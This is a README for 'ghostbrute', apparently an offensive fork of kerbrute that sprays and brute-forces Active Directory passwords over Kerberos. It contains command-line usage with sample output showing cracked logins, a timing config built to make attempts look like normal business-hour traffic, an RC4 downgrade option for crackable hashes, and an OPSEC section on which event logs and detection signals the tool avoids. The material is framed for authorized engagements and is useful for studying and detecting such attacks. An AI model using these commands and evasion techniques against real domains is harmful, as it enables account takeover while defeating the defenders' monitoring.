# ghostbrute

Evasive Kerberos password spraying with traffic-shaped timing.

Fork of [kerbrute](https://github.com/ropnop/kerbrute) by [@ropnop](https://github.com/ropnop). Adds a `spraycampaign` mode with [CaptainCredz](https://github.com/synacktiv/captaincredz)-style traffic shaping, cache/resume, and fine-grained timing control for long-running engagements.

## Why?

Kerbrute is already stealthier than SMB or LDAP spraying. Pre-auth failures generate 4768/4771, not the heavily-monitored 4625, and gokrb5's AS-REQ packets are indistinguishable from a real Windows client on the wire. No known byte-level signatures.

The only thing that burns it is speed. A burst of AS-REQs from one IP at 3 AM on a Sunday gets flagged by any rate-based detection. ghostbrute shapes spray traffic to match normal business-hour authentication patterns so the requests blend into legitimate AD noise.

## What's new over kerbrute

- **`spraycampaign` command.** Spray a full password list across users, one password at a time, with traffic-shaped delays between each request.
- **Timing engine.** Hour-of-day and day-of-week speed factors, jitter, daily ramp. Configurable via JSON. Automatically pauses during off-hours.
- **Cache/resume.** JSON state file tracks every attempt. Ctrl+C, come back tomorrow, restart with the same cache file.
- **Lockout safety.** `--max-per-user` caps attempts per user. `--safe` aborts the whole campaign on any lockout.
- **Interruptible sleeps.** Ctrl+C exits immediately, even during a long off-hours delay.
- **Secure defaults.** Cache and log files are `0600`.

All original kerbrute commands (`userenum`, `passwordspray`, `bruteuser`, `bruteforce`) still work.

## Installing

Grab a binary from [releases](https://github.com/ghostbrute/ghostbrute/releases), or build from source:

```
git clone https://github.com/ghostbrute/ghostbrute.git
cd ghostbrute
make all
```

Builds for Linux, Windows, macOS (amd64 + arm64). Single static binary, no dependencies.

## spraycampaign

The main mode. Sprays one password at a time across all users with timing-shaped delays.

```
$ ./ghostbrute spraycampaign -d lab.ropnop.com --dc 10.0.0.5 \
    --timing-config timing.json \
    --cache-file client.cache \
    --safe --max-per-user 3 -v \
    users.txt passwords.txt

          __               __  __               __
   ____ _/ /_  ____  _____/ /_/ /_  _______  __/ /____
  / __ '/ __ \/ __ \/ ___/ __/ __ \/ ___/ / / / __/ _ \
 / /_/ / / / / /_/ (__  ) /_/ /_/ / /  / /_/ / /_/  __/
 \__, /_/ /_/\____/____/\__/_.___/_/   \__,_/\__/\___/
/____/

Version: v1.0.0 (5e46af8) - 09/18/26 - ghostbrute (based on kerbrute by @ropnop)

2026/09/18 09:12:01 >  Using KDC(s):
2026/09/18 09:12:01 >  	10.0.0.5:88
2026/09/18 09:12:01 >  Timing engine loaded: traffic-shaped delays active
2026/09/18 09:12:01 >    target_time=09:12:01 hour_factor=1.00 day_factor=1.00 speed=0.50 delay=10s
2026/09/18 09:12:01 >  Resuming campaign: 847 attempts already cached, skipping
2026/09/18 09:12:01 >  Loaded 312 users
2026/09/18 09:12:01 >  Loaded 15 passwords
2026/09/18 09:12:01 >  Starting spray campaign against 312 users
2026/09/18 09:12:01 >  === Password 4/15: spraying across 312 users ===
2026/09/18 09:12:01 >    Timing: target_time=09:12:01 hour_factor=1.00 day_factor=1.00 speed=0.50 delay=11.243s
2026/09/18 09:15:47 >  [+] VALID LOGIN:	 callen@lab.ropnop.com:Summer2026!
2026/09/18 09:48:12 >  Password sweep complete. Waiting 32s before next password...
2026/09/18 09:48:44 >  === Password 5/15: spraying across 312 users ===
...
2026/09/18 14:32:18 >  Campaign finished. Tested 3911 logins (3 successes) in 5h20m17s
2026/09/18 14:32:18 >  Total cached attempts: 4758 (successes: 3)
2026/09/18 14:32:18 >  Cache saved to: client.cache
```

It starts at password 4 because the cache already had 847 attempts from a previous run. Passwords 1-3 were already fully sprayed.

### spraycampaign flags

```
--timing-config string   JSON timing config for traffic-shaped delays
--cache-file string      Cache file for resume (default: ghostbrute.cache)
--max-per-user int       Max attempts per user per campaign (0 = unlimited)
--user-as-pass           Also try each username as its own password
```

### How it works

1. If `--user-as-pass` is set, tries every username as its own password first
2. Sprays password 1 across all users, with timing delays between each request
3. Waits between sweeps (3x the computed delay)
4. Sprays password 2, and so on
5. Pauses automatically during off-hours and resumes when the activity window opens
6. On Ctrl+C, saves state and exits cleanly. Restart with the same `--cache-file` to pick up where you left off

## userenum

Enumerate valid usernames via Kerberos. No login failures, no lockouts.

```
$ ./ghostbrute userenum -d lab.ropnop.com --dc 10.0.0.5 usernames.txt

2026/09/18 09:28:04 >  Using KDC(s):
2026/09/18 09:28:04 >  	10.0.0.5:88
2026/09/18 09:28:04 >  [+] VALID USERNAME:	 amata@lab.ropnop.com
2026/09/18 09:28:04 >  [+] VALID USERNAME:	 thoffman@lab.ropnop.com
2026/09/18 09:28:04 >  [+] VALID USERNAME:	 callen@lab.ropnop.com
2026/09/18 09:28:04 >  Done! Tested 1001 usernames (3 valid) in 0.425 seconds
```

## passwordspray

Spray a single password across a user list. For multiple passwords with timing, use `spraycampaign` instead.

```
$ ./ghostbrute passwordspray -d lab.ropnop.com --dc 10.0.0.5 users.txt 'Spring2026!'

2026/09/18 09:37:29 >  Using KDC(s):
2026/09/18 09:37:29 >  	10.0.0.5:88
2026/09/18 09:37:35 >  [+] VALID LOGIN:	 callen@lab.ropnop.com:Spring2026!
2026/09/18 09:37:37 >  [+] VALID LOGIN:	 eshort@lab.ropnop.com:Spring2026!
2026/09/18 09:37:37 >  Done! Tested 2755 logins (2 successes) in 7.674 seconds
```

## bruteuser

Bruteforce a single user from a wordlist. Only run this without a lockout policy.

```
$ ./ghostbrute bruteuser -d lab.ropnop.com --dc 10.0.0.5 passwords.txt thoffman

2026/09/18 09:38:24 >  Using KDC(s):
2026/09/18 09:38:24 >  	10.0.0.5:88
2026/09/18 09:38:27 >  [+] VALID LOGIN:	 thoffman@lab.ropnop.com:Summer2017
2026/09/18 09:38:27 >  Done! Tested 1001 logins (1 successes) in 2.711 seconds
```

## bruteforce

Test `username:password` combos from a file or stdin.

```
$ cat combos.txt | ./ghostbrute bruteforce -d lab.ropnop.com --dc 10.0.0.5 -

2026/09/18 09:40:56 >  Using KDC(s):
2026/09/18 09:40:56 >  	10.0.0.5:88
2026/09/18 09:40:56 >  [+] VALID LOGIN:	 athomas@lab.ropnop.com:Password1234
2026/09/18 09:40:56 >  Done! Tested 7 logins (1 successes) in 0.114 seconds
```

## Timing configuration

The timing engine shapes spray speed by time of day and day of week. Pass a JSON config with `--timing-config`:

```json
{
  "utc_offset": 2,
  "base_delay": 5.0,
  "daily_speedup": 1.25,
  "initial_speed": 0.5,
  "jitter_min": 1.0,
  "jitter_max": 3.0,
  "hours_factor": {
    "0": 0.1, "1": 0.1, "2": 0.1, "3": 0.1,
    "4": 0.1, "5": 0.1, "6": 0.2, "7": 0.5,
    "8": 1.0, "9": 1.0, "10": 0.8, "11": 0.4,
    "12": 0.6, "13": 0.8, "14": 0.5, "15": 0.5,
    "16": 0.5, "17": 0.5, "18": 0.6, "19": 0.3,
    "20": 0.2, "21": 0.1, "22": 0.1, "23": 0.1
  },
  "days_factor": {
    "mon": 1.0, "tue": 1.0, "wed": 1.0, "thu": 1.0, "fri": 1.0,
    "sat": 0.1, "sun": 0.1
  }
}
```

See [`timing.example.json`](timing.example.json) for a ready-to-use config.

### Fields

`utc_offset`: Target timezone as UTC offset (e.g. `2` for CEST, `-5` for EST). Default `0`.

`base_delay`: Seconds between requests when all factors are 1.0. Default `5.0`.

`initial_speed` / `daily_speedup`: Speed ramp. The multiplier is `initial_speed * daily_speedup ^ days_running`, capped at 10x. So with `initial_speed=0.5` and `daily_speedup=1.25`, day 1 is half speed, day 5 is ~1.5x, and it caps at 10x. Default both `1.0` (no ramp).

`jitter_min` / `jitter_max`: Random jitter range in seconds, added to every delay. Default `0`.

`hours_factor`: Speed factor per hour, keyed `"0"` through `"23"`. `1.0` = full speed, `0.1` = 10x slower. Missing hours default to `0.5`.

`days_factor`: Speed factor per weekday, keyed `"mon"` through `"sun"`. Same scale. Missing days default to `0.5`.

### Delay formula

```
effective_delay = base_delay / (hour_factor * day_factor * speed_multiplier) + jitter
```

Minimum 100ms regardless of config.

At 9 AM Tuesday with the example config: `5.0 / (1.0 * 1.0 * 0.5) + ~2s jitter ≈ 12 seconds`.

At 2 AM Sunday: `hour_factor * day_factor = 0.01`, which is below 0.05. The campaign pauses entirely and polls every 30 seconds until the window opens back up.

## Cache / resume

Every attempt gets written to a JSON cache file:

```json
{
  "results": [
    {"username":"jsmith","password":"Spring2026!","success":false,"error":"Invalid password","timestamp":"2026-09-18T09:15:32Z"},
    {"username":"jdoe","password":"Spring2026!","success":true,"timestamp":"2026-09-18T09:15:37Z"}
  ]
}
```

Restart with the same `--cache-file` and already-tried pairs get skipped. The file is `0600` (owner read/write only).

## Global flags

```
-d, --domain string      Full domain (e.g. contoso.com)
    --dc string          Domain Controller to target. Looked up via DNS if blank
-o, --output string      Log file (0600 permissions)
-v, --verbose            Log failures and errors
    --safe               Abort if any user comes back locked out
-t, --threads int        Threads (default 10)
    --delay int          Delay in ms between attempts. Forces single thread
    --downgrade          Force arcfour-hmac-md5 (for crackable AS-REP hashes)
    --hash-file string   Save captured AS-REP hashes to file
```

## OPSEC

What works in your favor:
- Pre-auth failures generate 4768/4771, not 4625
- The Kerberos packets match real Windows clients on the wire
- Traffic shaping blends into normal auth patterns
- Off-hours pausing avoids dead-of-night anomalies

What can still catch you:
- **Volume thresholds.** Network monitoring that counts authentication requests per source IP over a time window. The timing engine keeps you under typical thresholds, but every environment is different
- **Cross-user correlation.** One IP authenticating as hundreds of different users in a short period is not normal, no matter the speed. Spread over time, this signal weakens but never fully disappears
- **Protocol metadata.** Newer Windows versions log additional fields on Kerberos events (supported encryption types, client info) that defenders can use to spot non-standard clients. gokrb5 is clean today, but this is an evolving area

Failed Kerberos pre-auth counts as a failed login and **will** lock out accounts. Use `--safe` and `--max-per-user` on real engagements.

## Credits

- [kerbrute](https://github.com/ropnop/kerbrute) by [@ropnop](https://github.com/ropnop): the foundation this is built on
- [gokrb5](https://github.com/jcmturner/gokrb5) by jcmturner: pure Go Kerberos implementation
- [CaptainCredz](https://github.com/synacktiv/captaincredz) by Synacktiv: timing engine inspiration
- [deadjakk](https://github.com/deadjakk): original spraycampaign concept ([PR #41](https://github.com/ropnop/kerbrute/pull/41))

## License

Same as kerbrute. See [LICENSE](LICENSE).
